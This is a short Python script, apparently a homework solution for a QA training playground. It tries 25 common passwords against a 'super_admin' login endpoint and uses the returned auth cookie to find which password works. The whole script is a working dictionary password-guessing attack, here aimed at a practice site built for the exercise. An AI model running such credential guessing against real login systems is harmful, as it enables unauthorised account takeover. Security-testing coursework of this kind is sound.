import requests


url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
map = [ {"login":"super_admin", "password": "password"},
{"login":"super_admin", "password": "123456"},
{"login":"super_admin", "password": "123456789"},
{"login":"super_admin", "password": "qwerty"},
{"login":"super_admin", "password": "password"},
{"login":"super_admin", "password": "1234567"},
{"login":"super_admin", "password": "12345678"},
{"login":"super_admin", "password": "12345"},
{"login":"super_admin", "password": "iloveyou"},
{"login":"super_admin", "password": "111111"},
{"login":"super_admin", "password": "123123"},
{"login":"super_admin", "password": "abc123"},
{"login":"super_admin", "password": "qwerty123"},
{"login":"super_admin", "password": "1q2w3e4r"},
{"login":"super_admin", "password": "admin"},
{"login":"super_admin", "password": "qwertyuiop"},
{"login":"super_admin", "password": "654321"},
{"login":"super_admin", "password": "555555"},
{"login":"super_admin", "password": "7777777"},
{"login":"super_admin", "password": "welcome"},
{"login":"super_admin", "password": "888888"},
{"login":"super_admin", "password": "princess"},
{"login":"super_admin", "password": "dragon"},
{"login":"super_admin", "password": "password1"},
{"login":"super_admin", "password": "123qwe"},]

for data in map:
    response1 = requests.post(url, data=data)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text != "You are NOT authorized":
        print(data)
        print("information = ", response2.text)




